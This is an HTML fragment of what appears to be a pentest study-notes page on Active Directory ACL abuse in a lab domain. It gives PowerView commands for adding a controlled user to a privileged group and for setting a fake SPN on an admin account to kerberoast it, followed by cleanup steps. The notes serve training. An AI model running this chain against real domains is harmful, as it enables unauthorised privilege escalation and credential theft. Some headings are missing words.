+<p>Multi-Factor Authentication (MFA):</p>
+<ul>
+<li>Apply MFA for an additional security layer, especially for privileged accounts.</li>
+</ul>
+</li>
+<li>
+<p>Regular Updates and Patching:</p>
+<ul>
+<li>Keep systems updated to protect against known vulnerabilities.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="text-drawing-of-acl-abuse-chain">Text Drawing of ACL Abuse Chain:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="&#43;--------------------------&#43;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;-----------------------&#43;%0a%7c%20%20%20%20wley/Current%20User%20%20%20%20%20%7c%20%20%20%20&#43;#Lateral%20Move#&#43;%20%20%20%7c%20damundsen/Target%20User%20%7c%0a%7c--------------------------%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c-----------------------%7c%0a%7c%20%20%20%20%20%20%20%20Right:%20N/A%20%20%20%20%20%20%20%20%7c---%28Change%20Password%29--%3e%7c%20%20%20Right:%20GenericAll%20%20%20%7c%0a&#43;--------------------------&#43;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;-----------------------&#43;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>+--------------------------+                       +-----------------------+
+</span></span><span style="display:flex;"><span>|    wley/Current User     |    +#Lateral Move#+   | damundsen/Target User |
+</span></span><span style="display:flex;"><span>|--------------------------|                       |-----------------------|
+</span></span><span style="display:flex;"><span>|        Right: N/A        |---<span style="color:#f92672">(</span>Change Password<span style="color:#f92672">)</span>--&gt;|   Right: GenericAll   |
+</span></span><span style="display:flex;"><span>+--------------------------+                       +-----------------------+</span></span></code></pre></div>
+    
+</div>
+<h3 id="abusing-group-membership-management-permissions">Abusing Group Membership Management Permissions:</h3>
+<h4 id="abusing-group-membership-management-using">Abusing Group Membership Management using :</h4>
+<ul>
+<li>
+<p><!-- raw HTML omitted -->Description<!-- raw HTML omitted -->: Exploit the rights to add/remove users from groups.</p>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Impact<!-- raw HTML omitted -->: Potential to add controlled account into privileged AD groups.</p>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Tools<!-- raw HTML omitted -->:</p>
+<ul>
+<li>
+<ul>
+<li><code>Command</code>: Add-DomainGroupMember</li>
+<li><code>Command</code>: Remove-DomainGroupMember</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><em>See the example&rsquo;s as an extension of the</em> <a href="#abusing-change-reset-password-permissions-to-reset-change-password-using">Abusing Change/Reset Password Permissions ACL to reset/change password</a>  <em>/examples</em>:</p>
+<ul>
+<li><strong>Recap</strong> We have now have control <code>&lt;target_user&gt;/damundsen</code> after changing their password by ACL Abuse in the previous part.</li>
+<li><code>&lt;target_user&gt;/damundsen</code>  has the power to add anyone to the <code>&lt;target_group&gt;/ Help Desk 1</code></li>
+<li><del>Attack Aim</del>: Authenticate as <code>&lt;target_user&gt;/damundsen</code> and leverate their <code>GenericAll</code> rights to add a user we control to the <code>Help Desk Level 1</code> group so we can move laterally/vertically.</li>
+</ul>
+</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p><strong>Create Credentialed Object for</strong> <code>&lt;target_user&gt;</code></p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->Convert password to<!-- raw HTML omitted --> <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0">SecureString</a>:</p>
+<ul>
+<li><code>Command</code>: $SecPassword = ConvertTo-SecureString &lsquo;&lt;KnownPasswordHere&gt;&rsquo; -AsPlainText -Force</li>
+<li><del>Example</del>: $SecPassword = ConvertTo-SecureString &lsquo;Pwn3d_by_ACLs!&rsquo; -AsPlainText -Force</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Create<!-- raw HTML omitted --> <a href="https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.3.0&amp;viewFallbackFrom=powershellsdk-7.0.0">credential object</a> <!-- raw HTML omitted -->for<!-- raw HTML omitted --> <code>&lt;target_user&gt;</code>:</p>
+<ul>
+<li><code>Command</code>: $Cred2 = New-Object System.Management.Automation.PSCredential(&rsquo;&lt;domainName&gt;\&lt;target_user&gt;&rsquo;, $SecPassword)</li>
+<li><del>Example</del>: $Cred2 = New-Object System.Management.Automation.PSCredential(&lsquo;INLANEFREIGHT\damundsen&rsquo;, $SecPassword)</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>Check if user is already part of the group</strong>:</p>
+<ul>
+<li><code>Command</code>: Get-ADGroup -Identity &ldquo;&lt;target_group&gt;&rdquo; -Properties * | Select -ExpandProperty Members</li>
+<li><del>Example</del>: Get-ADGroup -Identity &ldquo;Help Desk Level 1&rdquo; -Properties * | Select -ExpandProperty Members</li>
+</ul>
+</li>
+<li>
+<p><strong>Add <code>&lt;target_user&gt;</code> to Group</strong>:</p>
+<ul>
+<li><code>Command</code>: Add-DomainGroupMember -Identity &lsquo;&lt;target_group&gt;&rsquo; -Members &lsquo;&lt;target_user&gt;&rsquo; -Credential $Cred2 -Verbose</li>
+<li><del>Example</del>: Add-DomainGroupMember -Identity &lsquo;Help Desk Level 1&rsquo; -Members &lsquo;damundsen&rsquo; -Credential $Cred2 -Verbose</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify User has been added</strong>:</p>
+<ul>
+<li><code>Command</code>: Get-DomainGroupMember -Identity &ldquo;&lt;target_group&gt;&rdquo; | Select MemberName</li>
+<li><del>Example</del>: Get-DomainGroupMember -Identity &ldquo;Help Desk Level 1&rdquo; | Select MemberName</li>
+</ul>
+</li>
+</ol>
+<h4 id="text-drawing-of-acl-abuse-chain">Text Drawing of ACL Abuse Chain:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%0a&#43;--------------------------&#43;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;-----------------------&#43;%0a%7c%20%20%20%20wley/Current%20User%20%20%20%20%20%7c%20%20%20%20&#43;#Lateral%20Move#&#43;%20%20%20%7c%20damundsen/Target%20User%20%7c%0a%7c--------------------------%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c-----------------------%7c%0a%7c%20%20%20%20%20%20%20%20Right:%20N/A%20%20%20%20%20%20%20%20%7c---%28Change%20Password%29--%3e%7c%20%20%20Right:%20GenericAll%20%20%20%7c%0a&#43;--------------------------&#43;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;-----------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%28Add%20to%20Help%20Desk%20Level%201%20Group%29%20&#43;#Vertical%20Move#&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20V%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Help%20Desk%20Level%201%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20Group%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c---------------------%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Right:%20N/A%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%5e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%28Inherited%20Permissions%29%7c%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20V%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Information%20Tech%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20Group%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c---------------------%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Right:%20GenericAll%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>+--------------------------+                       +-----------------------+
+</span></span><span style="display:flex;"><span>|    wley/Current User     |    +#Lateral Move#+   | damundsen/Target User |
+</span></span><span style="display:flex;"><span>|--------------------------|                       |-----------------------|
+</span></span><span style="display:flex;"><span>|        Right: N/A        |---<span style="color:#f92672">(</span>Change Password<span style="color:#f92672">)</span>--&gt;|   Right: GenericAll   |
+</span></span><span style="display:flex;"><span>+--------------------------+                       +-----------------------+
+</span></span><span style="display:flex;"><span>                                                                |
+</span></span><span style="display:flex;"><span>                                                                | <span style="color:#f92672">(</span>Add to Help Desk Level <span style="color:#ae81ff">1</span> Group<span style="color:#f92672">)</span> +#Vertical Move#+
+</span></span><span style="display:flex;"><span>                                                                V
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                        | Help Desk Level <span style="color:#ae81ff">1</span>   |
+</span></span><span style="display:flex;"><span>                                                        |       Group         |
+</span></span><span style="display:flex;"><span>                                                        |---------------------|
+</span></span><span style="display:flex;"><span>                                                        | Right: N/A          |
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                                |   ^
+</span></span><span style="display:flex;"><span>                                         <span style="color:#f92672">(</span>Inherited Permissions<span style="color:#f92672">)</span>|   |
+</span></span><span style="display:flex;"><span>                                                                |   |
+</span></span><span style="display:flex;"><span>                                                                V   |
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                        | Information Tech    |
+</span></span><span style="display:flex;"><span>                                                        |       Group         |
+</span></span><span style="display:flex;"><span>                                                        |---------------------|
+</span></span><span style="display:flex;"><span>                                                        | Right: GenericAll   |
+</span></span><span style="display:flex;"><span>                                                        +---------------------+</span></span></code></pre></div>
+    
+</div>
+<h3 id="abusing-genericall-permissions">Abusing GenericALl Permissions:</h3>
+<ul>
+<li></li>
+<li><del>DACL Attack</del> !!!</li>
+</ul>
+<h4 id="abusing-genericall-to-create-a-fake-to-allow-us">Abusing GenericAll to Create a Fake to allow us :</h4>
+<ul>
+<li><em>See the example&rsquo;s as an extension of the</em> <em>&amp;</em> <em>examples</em>:
+<ul>
+<li><strong>Recap</strong>: We have now have control <code>&lt;target_user&gt;/damundsen</code> after changing their password by ACL Abuse &amp; we have added them to the <code>Help Desk 1</code> group. This group is a nested group and is nested in the <code>Information Technology</code> group which means the user <code>damundsen</code> has inherrited a <code>GenericAll</code> right.</li>
+<li><code>&lt;target_user&gt;/damundsen</code>  has the power to add anyone to the <code>&lt;target_group&gt;/ Help Desk 1</code></li>
+<li><del>Attack-Aim</del>: To create a fake SPN for the user <code>&lt;admin_user&gt;/adunn</code> (who is part of the Information Technology Group) to allow us to kerberoast to get the ticket/hash.</li>
+<li>This also utlizes the <code>$cred2</code> variable we used in the previous step.</li>
+</ul>
+</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p><strong>Create a fake</strong> :</p>
+<ul>
+<li><code>Command</code>: Set-DomainObject -Credential $Cred2 -Identity &lt;admin_user&gt; -SET @{serviceprincipalname=&rsquo;&lt;FakeSPN/Name&gt;&rsquo;} -Verbose</li>
+<li><del>Example</del>: Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=&lsquo;notahacker/LEGIT&rsquo;} -Verbose</li>
+</ul>
+</li>
+<li>
+<p><strong>Use any method of</strong> <strong>we like to grab the ticket</strong>:</p>
+</li>
+</ol>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Cleaning up the above chain:</p>
+<ul>
+<li>This order is important because if we remove the user from the group first, then we won&rsquo;t have the rights to remove the fake SPN!!!</li>
+<li>Utlizes the <code>cred2</code> variable set in previous steps.</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ol>
+<li><strong>Removing the Fake</strong> <strong>from <code>&lt;target_admin&gt;/adunn</code>&rsquo;s *Account</strong>:
+<ul>
+<li><code>Command</code>: Set-DomainObject -Credential $Cred2 -Identity &lt;Target_Admin&gt; -Clear serviceprincipalname -Verbose</li>
+<li><del>Example</del>: Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</li>
+</ul>
+</li>
+<li><strong>Removing <code>&lt;target_user&gt;/damundsen</code> *from the <code>Help Desk Level 1</code> *Group</strong>:
+<ul>
+<li><code>Command</code>: Remove-DomainGroupMember -Identity &ldquo;Help Desk Level 1&rdquo; -Members &lsquo;&lt;Target_User&gt;&rsquo; -Credential $Cred2 -Verbose</li>
+<li><del>Example</del>: Remove-DomainGroupMember -Identity &ldquo;Help Desk Level 1&rdquo; -Members &lsquo;damundsen&rsquo; -Credential $Cred2 -Verbose</li>
+</ul>
+</li>
+<li><strong>Confirming <code>&lt;target_user&gt;/damundsen</code> *was Removed from the</strong> <code>&lt;Target_Group&gt;</code>:
+<ul>
+<li><code>Command</code>: Get-DomainGroupMember -Identity &ldquo;&lt;target_group&gt;&rdquo; | Select MemberName |? {$_.MemberName -eq &lsquo;&lt;target_user&gt;&rsquo;} -Verbose</li>
+<li><del>Example</del>: Get-DomainGroupMember -Identity &ldquo;Help Desk Level 1&rdquo; | Select MemberName |? {$_.MemberName -eq &lsquo;damundsen&rsquo;} -Verbose</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Text Drawing of ACL Abuse Chain:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="&#43;--------------------------&#43;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;-----------------------&#43;%0a%7c%20%20%20%20wley/Current%20User%20%20%20%20%20%7c%20%20%20%20&#43;#Lateral%20Move#&#43;%20%20%20%7c%20damundsen/Target%20User%20%7c%0a%7c--------------------------%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c-----------------------%7c%0a%7c%20%20%20%20%20%20%20%20Right:%20N/A%20%20%20%20%20%20%20%20%7c---%28Change%20Password%29--%3e%7c%20%20%20Right:%20GenericAll%20%20%20%7c%0a&#43;--------------------------&#43;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;-----------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%28Add%20to%20Help%20Desk%20Level%201%20Group%29%20&#43;#Vertical%20Move#&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20V%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Help%20Desk%20Level%201%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20Group%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c---------------------%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Right:%20N/A%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%5e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%28Inherited%20Permissions%29%7c%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20V%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Information%20Tech%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20Group%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20